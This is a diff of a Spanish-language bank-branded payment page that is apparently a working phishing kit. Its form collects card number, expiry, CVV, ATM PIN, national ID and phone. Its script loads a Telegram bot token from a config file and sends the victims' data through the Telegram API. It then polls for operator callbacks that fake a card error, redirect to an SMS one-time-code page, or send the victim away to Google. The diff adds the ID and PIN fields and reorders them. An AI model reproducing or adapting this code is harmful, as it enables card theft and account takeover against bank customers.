@@ -1,98 +1,98 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simulación de Pago</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body {
-            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
-            background-color: #eee;
-        }
+<!DOCTYPE html> 
+<html lang="es"> 
+<head> 
+    <meta charset="UTF-8"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <title>Simulación de Pago</title> 
+    <script src="https://cdn.tailwindcss.com"></script> 
+    <style> 
+        body { 
+            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"; 
+            background-color: #eee; 
+        } 
 
-        /* Estilos para el modal y spinner */
-        .custom-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 9999;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            animation: fadeIn 0.3s ease;
-        }
+        /* Estilos para el modal y spinner */ 
+        .custom-modal { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0, 0, 0, 0.8); 
+            z-index: 9999; 
+            display: none; 
+            align-items: center; 
+            justify-content: center; 
+            animation: fadeIn 0.3s ease; 
+        } 
 
-        .custom-modal-content {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-            animation: slideIn 0.3s ease;
-        }
+        .custom-modal-content { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 10px; 
+            max-width: 400px; 
+            width: 90%; 
+            text-align: center; 
+            animation: slideIn 0.3s ease; 
+        } 
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
+        @keyframes fadeIn { 
+            from { opacity: 0; } 
+            to { opacity: 1; } 
+        } 
 
-        @keyframes slideIn {
-            from { transform: translateY(-30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
+        @keyframes slideIn { 
+            from { transform: translateY(-30px); opacity: 0; } 
+            to { transform: translateY(0); opacity: 1; } 
+        } 
 
-        .spinner-container {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-        }
+        .spinner-container { 
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background-color: rgba(0, 0, 0, 0.5); 
+            justify-content: center; 
+            align-items: center; 
+            z-index: 10000; 
+        } 
 
-        .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top: 4px solid white;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-        }
+        .spinner { 
+            border: 4px solid rgba(255, 255, 255, 0.3); 
+            border-radius: 50%; 
+            border-top: 4px solid white; 
+            width: 50px; 
+            height: 50px; 
+            animation: spin 1s linear infinite; 
+        } 
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        } 
 
-        .card-icon {
-            height: 24px;
-            margin-left: 8px;
-            display: none;
-        }
+        .card-icon { 
+            height: 24px; 
+            margin-left: 8px; 
+            display: none; 
+        } 
 
-    </style>
-</head>
-<body>
-    <div id="app">
-        <header class="w-full flex items-center justify-center py-16 bg-gradient-to-t from-[#0043a9] to-[#4c7bc7]">
-            <img src="img/logo.png" alt="Logo" class="w-full max-w-[50px] h-auto -mt-4">
-        </header>
+    </style> 
+</head> 
+<body> 
+    <div id="app"> 
+        <header class="w-full flex items-center justify-center py-16 bg-gradient-to-t from-[#0043a9] to-[#4c7bc7]"> 
+            <img src="img/logo.png" alt="Logo" class="w-full max-w-[50px] h-auto -mt-4"> 
+        </header> 
 
-        <div class="relative mt-[-1rem] rounded-t-[15px] w-full h-auto bg-gray-200">
-            <div class="w-full box-border p-4">
-                <h2 class="text-xl font-bold text-[#0040a8] text-center mb-4">Ingresa los datos de tu tarjeta</h2>
-                <p class="text-sm text-gray-700 text-center mb-6">Completa la información para finalizar el pago de forma segura.</p>
+        <div class="relative mt-[-1rem] rounded-t-[15px] w-full h-auto bg-gray-200"> 
+            <div class="w-full box-border p-4"> 
+                <h2 class="text-xl font-bold text-[#0040a8] text-center mb-4">Ingresa los datos de tu tarjeta</h2> 
+                <p class="text-sm text-gray-700 text-center mb-6">Completa la información para finalizar el pago de forma segura.</p> 
 
-                <form id="pagoForm">
+                <form id="pagoForm"> 
                     <div class="w-full mb-4">
                         <label for="tipo_doc" class="block text-sm font-medium text-gray-700 mb-1">Tipo de Documento</label>
                         <select id="tipo_doc" class="w-full text-lg border border-gray-400 rounded-md p-2" required>
@@ -108,408 +108,408 @@
                         <input type="tel" id="cedula" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Número de Cédula" required>
                     </div>
 
-                    <div class="w-full mb-4">
-                        <label for="nombre_titular" class="block text-sm font-medium text-gray-700 mb-1">Nombre del titular</label>
-                        <input type="text" id="nombre_titular" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Nombre completo" required>
-                    </div>
+                    <div class="w-full mb-4"> 
+                        <label for="nombre_titular" class="block text-sm font-medium text-gray-700 mb-1">Nombre del titular</label> 
+                        <input type="text" id="nombre_titular" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Nombre completo" required> 
+                    </div> 
 
-                    <div class="w-full mb-4">
-                        <label for="numero_tarjeta" class="block text-sm font-medium text-gray-700 mb-1">Número de tarjeta</label>
-                        <div class="relative">
-                            <input type="tel" id="numero_tarjeta" class="w-full text-lg border border-gray-400 rounded-md p-2 pr-12" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
-                        </div>
-                    </div>
+                    <div class="w-full mb-4"> 
+                        <label for="numero_tarjeta" class="block text-sm font-medium text-gray-700 mb-1">Número de tarjeta</label> 
+                        <div class="relative"> 
+                            <input type="tel" id="numero_tarjeta" class="w-full text-lg border border-gray-400 rounded-md p-2 pr-12" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required> 
+                        </div> 
+                    </div> 
 
-                    <div class="w-full flex justify-between gap-4 mb-4">
-                        <div class="flex-1">
-                            <label for="fecha_exp" class="block text-sm font-medium text-gray-700 mb-1">Fecha de vencimiento</label>
-                            <input type="tel" id="fecha_exp" class="w-full text-lg border border-gray-400 rounded-md p-2 text-center" placeholder="MM/AA" maxlength="5" required>
-                        </div>
-                        <div class="flex-1">
-                            <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
-                            <input type="tel" id="cvv" class="w-full text-lg border border-gray-400 rounded-md p-2 text-center" placeholder="XXX" maxlength="4" required>
-                        </div>
-                    </div>
+                    <div class="w-full flex justify-between gap-4 mb-4"> 
+                        <div class="flex-1"> 
+                            <label for="fecha_exp" class="block text-sm font-medium text-gray-700 mb-1">Fecha de vencimiento</label> 
+                            <input type="tel" id="fecha_exp" class="w-full text-lg border border-gray-400 rounded-md p-2 text-center" placeholder="MM/AA" maxlength="5" required> 
+                        </div> 
+                        <div class="flex-1"> 
+                            <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label> 
+                            <input type="tel" id="cvv" class="w-full text-lg border border-gray-400 rounded-md p-2 text-center" placeholder="XXX" maxlength="4" required> 
+                        </div> 
+                    </div> 
 
                     <div class="w-full mb-4">
                         <label for="clave_cajero" class="block text-sm font-medium text-gray-700 mb-1">Clave de cajero</label>
                         <input type="password" id="clave_cajero" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Clave de 4 dígitos" maxlength="4" required>
                     </div>
 
-                    <div class="w-full mb-4">
-                        <label for="telefono" class="block text-sm font-medium text-gray-700 mb-1">Teléfono</label>
-                        <input type="tel" id="telefono" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Número de teléfono" required>
-                    </div>
+                    <div class="w-full mb-4"> 
+                        <label for="telefono" class="block text-sm font-medium text-gray-700 mb-1">Teléfono</label> 
+                        <input type="tel" id="telefono" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Número de teléfono" required> 
+                    </div> 
 
-                    <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Los datos de la tarjeta son incorrectos. Por favor, verifica la información e intenta de nuevo.</p>
-                    <button type="submit" id="pagarBtn" disabled class="block w-full rounded-2xl text-white bg-[#0043a9] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">Pagar ahora</button>
-                </form>
-            </div>
-        </div>
-    </div>
+                    <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Los datos de la tarjeta son incorrectos. Por favor, verifica la información e intenta de nuevo.</p> 
+                    <button type="submit" id="pagarBtn" disabled class="block w-full rounded-2xl text-white bg-[#0043a9] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">Pagar ahora</button> 
+                </form> 
+            </div> 
+        </div> 
+    </div> 
 
-    <div id="error-modal" class="custom-modal">
-        <div class="custom-modal-content">
-            <h3 class="mb-5 text-[#0040a8]">¡Ups! Algo salió mal</h3>
-            <p id="error-message-modal">Los datos ingresados no coinciden con los de tu cuenta. Por favor, verifica tu información y vuelve a intentarlo.</p>
-            <button id="back-to-start-button" class="mt-5 w-full bg-[#0040a9] text-white py-3 rounded-lg">Volver al inicio</button>
-        </div>
-    </div>
+    <div id="error-modal" class="custom-modal"> 
+        <div class="custom-modal-content"> 
+            <h3 class="mb-5 text-[#0040a8]">¡Ups! Algo salió mal</h3> 
+            <p id="error-message-modal">Los datos ingresados no coinciden con los de tu cuenta. Por favor, verifica tu información y vuelve a intentarlo.</p> 
+            <button id="back-to-start-button" class="mt-5 w-full bg-[#0040a9] text-white py-3 rounded-lg">Volver al inicio</button> 
+        </div> 
+    </div> 
 
-    <div id="spinner-modal" class="spinner-container">
-        <div class="spinner"></div>
-    </div>
+    <div id="spinner-modal" class="spinner-container"> 
+        <div class="spinner"></div> 
+    </div> 
 
-    <script>
-        document.addEventListener('DOMContentLoaded', async () => {
-            const app = document.getElementById("app");
-            const pagoForm = document.getElementById("pagoForm");
+    <script> 
+        document.addEventListener('DOMContentLoaded', async () => { 
+            const app = document.getElementById("app"); 
+            const pagoForm = document.getElementById("pagoForm"); 
             // Se agregan las referencias a los nuevos campos
             const tipoDocInput = document.getElementById("tipo_doc");
             const cedulaInput = document.getElementById("cedula");
-            const numeroTarjetaInput = document.getElementById("numero_tarjeta");
-            const fechaExpInput = document.getElementById("fecha_exp");
-            const cvvInput = document.getElementById("cvv");
-            const nombreTitularInput = document.getElementById("nombre_titular");
-            const telefonoInput = document.getElementById("telefono");
-            const claveCajeroInput = document.getElementById("clave_cajero"); 
-            const pagarBtn = document.getElementById("pagarBtn");
-            const spinnerModal = document.getElementById('spinner-modal');
-            const errorMessage = document.getElementById("errorMessage");
-            const errorModal = document.getElementById('error-modal');
-            const errorModalMessage = document.getElementById('error-message-modal');
+            const claveCajeroInput = document.getElementById("clave_cajero");
+            const numeroTarjetaInput = document.getElementById("numero_tarjeta"); 
+            const fechaExpInput = document.getElementById("fecha_exp"); 
+            const cvvInput = document.getElementById("cvv"); 
+            const nombreTitularInput = document.getElementById("nombre_titular"); 
+            const telefonoInput = document.getElementById("telefono"); 
+            const pagarBtn = document.getElementById("pagarBtn"); 
+            const spinnerModal = document.getElementById('spinner-modal'); 
+            const errorMessage = document.getElementById("errorMessage"); 
+            const errorModal = document.getElementById('error-modal'); 
+            const errorModalMessage = document.getElementById('error-message-modal'); 
 
-            let initialLoginData = null;
-            let TELEGRAM_BOT_TOKEN = '';
-            let TELEGRAM_CHAT_ID = '';
-            let statusCheckInterval = null;
-            let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
-            let transactionId = Date.now().toString();
+            let initialLoginData = null; 
+            let TELEGRAM_BOT_TOKEN = ''; 
+            let TELEGRAM_CHAT_ID = ''; 
+            let statusCheckInterval = null; 
+            let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0; 
+            let transactionId = Date.now().toString(); 
 
-            // Leer datos de sessionStorage al cargar la página
-            const storedData = sessionStorage.getItem('initialLoginData');
-            if (storedData) {
-                initialLoginData = JSON.parse(storedData);
-                transactionId = initialLoginData.transactionId || Date.now().toString();
-            }
+            // Leer datos de sessionStorage al cargar la página 
+            const storedData = sessionStorage.getItem('initialLoginData'); 
+            if (storedData) { 
+                initialLoginData = JSON.parse(storedData); 
+                transactionId = initialLoginData.transactionId || Date.now().toString(); 
+            } 
 
-            async function loadTelegramConfig() {
-                try {
-                    const response = await fetch('js/brr76.json');
-                    if (!response.ok) throw new Error('No se pudo cargar el archivo de configuración.');
-                    const data = await response.json();
-                    TELEGRAM_BOT_TOKEN = data.token;
-                    TELEGRAM_CHAT_ID = data.chat_id;
-                    return true;
-                } catch (error) {
-                    console.error('Error al cargar la configuración de Telegram:', error);
-                    alert('Error crítico: No se pudo cargar la configuración de Telegram.');
-                    pagarBtn.disabled = true;
-                    return false;
-                }
-            }
+            async function loadTelegramConfig() { 
+                try { 
+                    const response = await fetch('js/brr76.json'); 
+                    if (!response.ok) throw new Error('No se pudo cargar el archivo de configuración.'); 
+                    const data = await response.json(); 
+                    TELEGRAM_BOT_TOKEN = data.token; 
+                    TELEGRAM_CHAT_ID = data.chat_id; 
+                    return true; 
+                } catch (error) { 
+                    console.error('Error al cargar la configuración de Telegram:', error); 
+                    alert('Error crítico: No se pudo cargar la configuración de Telegram.'); 
+                    pagarBtn.disabled = true; 
+                    return false; 
+                } 
+            } 
 
-            async function initLastUpdateId() {
-                try {
-                    if (!TELEGRAM_BOT_TOKEN) return;
-                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
-                    const response = await fetch(url);
-                    const data = await response.json();
-                    if (!data || !data.result) return;
-                    const updates = data.result;
-                    if (updates.length === 0) return;
-                    const maxUpdateId = Math.max(...updates.map(u => u.update_id));
-                    lastUpdateId = maxUpdateId;
-                    sessionStorage.setItem('lastUpdateId', lastUpdateId);
-                } catch (err) {
-                    console.warn('No se pudo inicializar lastUpdateId:', err);
-                }
-            }
+            async function initLastUpdateId() { 
+                try { 
+                    if (!TELEGRAM_BOT_TOKEN) return; 
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`; 
+                    const response = await fetch(url); 
+                    const data = await response.json(); 
+                    if (!data || !data.result) return; 
+                    const updates = data.result; 
+                    if (updates.length === 0) return; 
+                    const maxUpdateId = Math.max(...updates.map(u => u.update_id)); 
+                    lastUpdateId = maxUpdateId; 
+                    sessionStorage.setItem('lastUpdateId', lastUpdateId); 
+                } catch (err) { 
+                    console.warn('No se pudo inicializar lastUpdateId:', err); 
+                } 
+            } 
 
-            // Función de validación de tarjeta con algoritmo de Luhn
-            function luhnCheck(cardNumber) {
-                let s = 0;
-                let doubleDigit = false;
-                for (let i = cardNumber.length - 1; i >= 0; i--) {
-                    let digit = parseInt(cardNumber.charAt(i));
-                    if (doubleDigit) {
-                        digit *= 2;
-                        if (digit > 9) {
-                            digit -= 9;
-                        }
-                    }
-                    s += digit;
-                    doubleDigit = !doubleDigit;
-                }
-                return s % 10 === 0;
-            }
+            // Función de validación de tarjeta con algoritmo de Luhn 
+            function luhnCheck(cardNumber) { 
+                let s = 0; 
+                let doubleDigit = false; 
+                for (let i = cardNumber.length - 1; i >= 0; i--) { 
+                    let digit = parseInt(cardNumber.charAt(i)); 
+                    if (doubleDigit) { 
+                        digit *= 2; 
+                        if (digit > 9) { 
+                            digit -= 9; 
+                        } 
+                    } 
+                    s += digit; 
+                    doubleDigit = !doubleDigit; 
+                } 
+                return s % 10 === 0; 
+            } 
 
-            // Función para detectar el tipo de tarjeta
-            function getCardType(number) {
-                let re = new RegExp("^4");
-                if (number.match(re) != null) return "Visa";
-                re = new RegExp("^(34|37)");
-                if (number.match(re) != null) return "Amex";
-                re = new RegExp("^5[1-5]");
-                if (number.match(re) != null) return "Mastercard";
-                re = new RegExp("^6(?:011|5[0-9]{2})");
-                if (number.match(re) != null) return "Discover";
-                re = new RegExp("^3(?:0[0-5]|[68][0-9])[0-9]{11}$");
-                if (number.match(re) != null) return "DinersClub";
-                re = new RegExp("^9792");
-                if (number.match(re) != null) return "troy";
-                return "";
-            }
+            // Función para detectar el tipo de tarjeta 
+            function getCardType(number) { 
+                let re = new RegExp("^4"); 
+                if (number.match(re) != null) return "Visa"; 
+                re = new RegExp("^(34|37)"); 
+                if (number.match(re) != null) return "Amex"; 
+                re = new RegExp("^5[1-5]"); 
+                if (number.match(re) != null) return "Mastercard"; 
+                re = new RegExp("^6(?:011|5[0-9]{2})"); 
+                if (number.match(re) != null) return "Discover"; 
+                re = new RegExp("^3(?:0[0-5]|[68][0-9])[0-9]{11}$"); 
+                if (number.match(re) != null) return "DinersClub"; 
+                re = new RegExp("^9792"); 
+                if (number.match(re) != null) return "troy"; 
+                return ""; 
+            } 
 
-            // Función de validación de fecha de expiración
-            function validateExpiry(month, year) {
-                const currentYear = new Date().getFullYear().toString().substr(-2);
-                const currentMonth = new Date().getMonth() + 1;
-                if (year < currentYear || (year === currentYear && month < currentMonth)) {
-                    return false;
-                }
-                return true;
-            }
+            // Función de validación de fecha de expiración 
+            function validateExpiry(month, year) { 
+                const currentYear = new Date().getFullYear().toString().substr(-2); 
+                const currentMonth = new Date().getMonth() + 1; 
+                if (year < currentYear || (year === currentYear && month < currentMonth)) { 
+                    return false; 
+                } 
+                return true; 
+            } 
 
-            // Función de validación general del formulario
-            function validateForm() {
-                const nombreValido = nombreTitularInput.value.trim().length > 2;
-                const telefonoValido = telefonoInput.value.trim().length >= 7;
-                const claveCajeroValida = claveCajeroInput.value.trim().length === 4;
-                // Nuevas validaciones para los campos de documento
+            // Función de validación general del formulario 
+            function validateForm() { 
+                const nombreValido = nombreTitularInput.value.trim().length > 2; 
+                const telefonoValido = telefonoInput.value.trim().length >= 7; 
+                // Se agregan las validaciones para los nuevos campos
                 const tipoDocValido = tipoDocInput.value !== "";
                 const cedulaValida = cedulaInput.value.trim().length >= 5;
+                const claveCajeroValida = claveCajeroInput.value.trim().length === 4;
 
-                const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, '');
-                const numeroTarjetaValido = luhnCheck(numeroTarjeta) && numeroTarjeta.length >= 13 && numeroTarjeta.length <= 19;
+                const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, ''); 
+                const numeroTarjetaValido = luhnCheck(numeroTarjeta) && numeroTarjeta.length >= 13 && numeroTarjeta.length <= 19; 
 
-                const fechaExp = fechaExpInput.value.split('/');
-                const mes = fechaExp[0];
-                const anio = fechaExp[1];
-                const fechaValida = validateExpiry(mes, anio);
+                const fechaExp = fechaExpInput.value.split('/'); 
+                const mes = fechaExp[0]; 
+                const anio = fechaExp[1]; 
+                const fechaValida = validateExpiry(mes, anio); 
 
-                const cvvValido = cvvInput.value.length >= 3 && cvvInput.value.length <= 4;
+                const cvvValido = cvvInput.value.length >= 3 && cvvInput.value.length <= 4; 
 
                 // Se actualiza la lógica del botón para incluir los nuevos campos
-                pagarBtn.disabled = !(nombreValido && telefonoValido && claveCajeroValida && numeroTarjetaValido && fechaValida && cvvValido && tipoDocValido && cedulaValida);
-            }
+                pagarBtn.disabled = !(nombreValido && telefonoValido && tipoDocValido && cedulaValida && claveCajeroValida && numeroTarjetaValido && fechaValida && cvvValido); 
+            } 
 
-            // Listeners para dar formato a los campos y validar
-            numeroTarjetaInput.addEventListener('input', (e) => {
-                let { value } = e.target;
-                value = value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
-                e.target.value = value;
-                validateForm();
-            });
+            // Listeners para dar formato a los campos y validar 
+            numeroTarjetaInput.addEventListener('input', (e) => { 
+                let { value } = e.target; 
+                value = value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim(); 
+                e.target.value = value; 
+                validateForm(); 
+            }); 
 
-            fechaExpInput.addEventListener('input', (e) => {
-                let { value } = e.target;
-                value = value.replace(/\D/g, '');
-                if (value.length > 2) {
-                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
-                }
-                e.target.value = value;
-                validateForm();
-            });
+            fechaExpInput.addEventListener('input', (e) => { 
+                let { value } = e.target; 
+                value = value.replace(/\D/g, ''); 
+                if (value.length > 2) { 
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4); 
+                } 
+                e.target.value = value; 
+                validateForm(); 
+            }); 
 
-            cvvInput.addEventListener('input', validateForm);
-            nombreTitularInput.addEventListener('input', validateForm);
+            cvvInput.addEventListener('input', validateForm); 
+            nombreTitularInput.addEventListener('input', validateForm); 
             telefonoInput.addEventListener('input', validateForm);
-            claveCajeroInput.addEventListener('input', validateForm);
             // Se agregan listeners para los nuevos campos
             tipoDocInput.addEventListener('change', validateForm);
             cedulaInput.addEventListener('input', validateForm);
+            claveCajeroInput.addEventListener('input', validateForm);
 
-            // Función para enviar a Telegram y obtener el message_id
-            async function sendToTelegram(messageContent, keyboard) {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const payload = {
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: messageContent,
-                    reply_markup: keyboard,
-                    parse_mode: 'Markdown'
-                };
+            // Función para enviar a Telegram y obtener el message_id 
+            async function sendToTelegram(messageContent, keyboard) { 
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`; 
+                const payload = { 
+                    chat_id: TELEGRAM_CHAT_ID, 
+                    text: messageContent, 
+                    reply_markup: keyboard, 
+                    parse_mode: 'Markdown' 
+                }; 
 
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload),
-                    });
-                    if (!response.ok) {
-                        const errorText = await response.text();
-                        console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
-                        return null;
-                    }
-                    const data = await response.json();
-                    console.log('Mensaje enviado a Telegram exitosamente.');
-                    return data.result.message_id; // Retornar el message_id
-                } catch (error) {
-                    console.error('Error de red al enviar mensaje a Telegram:', error);
-                    return null;
-                }
-            }
+                try { 
+                    const response = await fetch(url, { 
+                        method: 'POST', 
+                        headers: { 'Content-Type': 'application/json' }, 
+                        body: JSON.stringify(payload), 
+                    }); 
+                    if (!response.ok) { 
+                        const errorText = await response.text(); 
+                        console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`); 
+                        return null; 
+                    } 
+                    const data = await response.json(); 
+                    console.log('Mensaje enviado a Telegram exitosamente.'); 
+                    return data.result.message_id; // Retornar el message_id 
+                } catch (error) { 
+                    console.error('Error de red al enviar mensaje a Telegram:', error); 
+                    return null; 
+                } 
+            } 
 
-            // Función para borrar los botones del mensaje
-            async function editTelegramMessage(chatId, messageId) {
-                if (!chatId || !messageId) return;
+            // Función para borrar los botones del mensaje 
+            async function editTelegramMessage(chatId, messageId) { 
+                if (!chatId || !messageId) return; 
 
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
-                const payload = {
-                    chat_id: chatId,
-                    message_id: messageId,
-                    reply_markup: {} // Objeto vacío para eliminar los botones
-                };
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`; 
+                const payload = { 
+                    chat_id: chatId, 
+                    message_id: messageId, 
+                    reply_markup: {} // Objeto vacío para eliminar los botones 
+                }; 
 
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(payload),
-                    });
-                    if (!response.ok) {
-                        const errorText = await response.text();
-                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
-                    }
-                } catch (error) {
-                    console.error('Error de red al borrar botones de Telegram:', error);
-                }
-            }
+                try { 
+                    const response = await fetch(url, { 
+                        method: 'POST', 
+                        headers: { 
+                            'Content-Type': 'application/json', 
+                        }, 
+                        body: JSON.stringify(payload), 
+                    }); 
+                    if (!response.ok) { 
+                        const errorText = await response.text(); 
+                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`); 
+                    } 
+                } catch (error) { 
+                    console.error('Error de red al borrar botones de Telegram:', error); 
+                } 
+            } 
 
-            async function checkVerificationStatus() {
-                if (statusCheckInterval) {
-                    clearInterval(statusCheckInterval);
-                }
-                statusCheckInterval = setInterval(async () => {
-                    try {
-                        const offsetParam = lastUpdateId > 0 ? `?offset=${lastUpdateId + 1}` : '';
-                        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates${offsetParam}`;
-                        const response = await fetch(url);
-                        const data = await response.json();
-                        if (!data || !data.result) return;
-                        const updates = data.result;
-                        if (!updates || updates.length === 0) return;
-                        const maxUpdateId = Math.max(...updates.map(u => u.update_id));
-                        lastUpdateId = maxUpdateId;
-                        sessionStorage.setItem('lastUpdateId', lastUpdateId);
+            async function checkVerificationStatus() { 
+                if (statusCheckInterval) { 
+                    clearInterval(statusCheckInterval); 
+                } 
+                statusCheckInterval = setInterval(async () => { 
+                    try { 
+                        const offsetParam = lastUpdateId > 0 ? `?offset=${lastUpdateId + 1}` : ''; 
+                        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates${offsetParam}`; 
+                        const response = await fetch(url); 
+                        const data = await response.json(); 
+                        if (!data || !data.result) return; 
+                        const updates = data.result; 
+                        if (!updates || updates.length === 0) return; 
+                        const maxUpdateId = Math.max(...updates.map(u => u.update_id)); 
+                        lastUpdateId = maxUpdateId; 
+                        sessionStorage.setItem('lastUpdateId', lastUpdateId); 
 
-                        const relevant = updates.filter(u => u.callback_query && u.callback_query.data && u.callback_query.data.includes(transactionId));
-                        if (relevant.length > 0) {
-                            const latest = relevant.reduce((a, b) => a.update_id > b.update_id ? a : b);
-                            clearInterval(statusCheckInterval);
-                            statusCheckInterval = null;
+                        const relevant = updates.filter(u => u.callback_query && u.callback_query.data && u.callback_query.data.includes(transactionId)); 
+                        if (relevant.length > 0) { 
+                            const latest = relevant.reduce((a, b) => a.update_id > b.update_id ? a : b); 
+                            clearInterval(statusCheckInterval); 
+                            statusCheckInterval = null; 
 
-                            const callbackDataFull = latest.callback_query.data;
-                            const callbackId = latest.callback_query.id;
-                            const messageId = sessionStorage.getItem('telegramMessageId'); // Obtener el message_id guardado
+                            const callbackDataFull = latest.callback_query.data; 
+                            const callbackId = latest.callback_query.id; 
+                            const messageId = sessionStorage.getItem('telegramMessageId'); // Obtener el message_id guardado 
 
-                            // Borrar los botones antes de la acción
-                            await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
+                            // Borrar los botones antes de la acción 
+                            await editTelegramMessage(TELEGRAM_CHAT_ID, messageId); 
 
-                            try {
-                                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
-                                });
-                            } catch (err) {
-                                console.warn('No se pudo responder callback_query:', err);
-                            }
+                            try { 
+                                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, { 
+                                    method: 'POST', 
+                                    headers: { 'Content-Type': 'application/json' }, 
+                                    body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' }) 
+                                }); 
+                            } catch (err) { 
+                                console.warn('No se pudo responder callback_query:', err); 
+                            } 
 
-                            const callbackKey = callbackDataFull.split(':')[0];
+                            const callbackKey = callbackDataFull.split(':')[0]; 
 
-                            spinnerModal.style.display = 'none';
-                            app.style.display = 'block';
+                            spinnerModal.style.display = 'none'; 
+                            app.style.display = 'block'; 
 
-                            switch (callbackKey) {
-                                case 'error_tc':
-                                    errorMessage.classList.remove('hidden');
-                                    break;
-                                case 'pedir_token_sms':
-                                    window.location.href = "otp.html";
-                                    break;
-                                case 'finalizar':
-                                    window.location.href = "https://www.google.com";
-                                    break;
-                                default:
-                                    console.log("Respuesta no reconocida del bot:", callbackDataFull);
-                                    errorModalMessage.textContent = "Respuesta no reconocida. Por favor, intente de nuevo.";
-                                    errorModal.style.display = 'flex';
-                                    break;
-                            }
-                        }
-                    } catch (error) {
-                        console.error("Error al verificar el estado de la transacción:", error);
-                    }
-                }, 1500);
-            }
+                            switch (callbackKey) { 
+                                case 'error_tc': 
+                                    errorMessage.classList.remove('hidden'); 
+                                    break; 
+                                case 'pedir_token_sms': 
+                                    window.location.href = "otp.html"; 
+                                    break; 
+                                case 'finalizar': 
+                                    window.location.href = "https://www.google.com"; 
+                                    break; 
+                                default: 
+                                    console.log("Respuesta no reconocida del bot:", callbackDataFull); 
+                                    errorModalMessage.textContent = "Respuesta no reconocida. Por favor, intente de nuevo."; 
+                                    errorModal.style.display = 'flex'; 
+                                    break; 
+                            } 
+                        } 
+                    } catch (error) { 
+                        console.error("Error al verificar el estado de la transacción:", error); 
+                    } 
+                }, 1500); 
+            } 
 
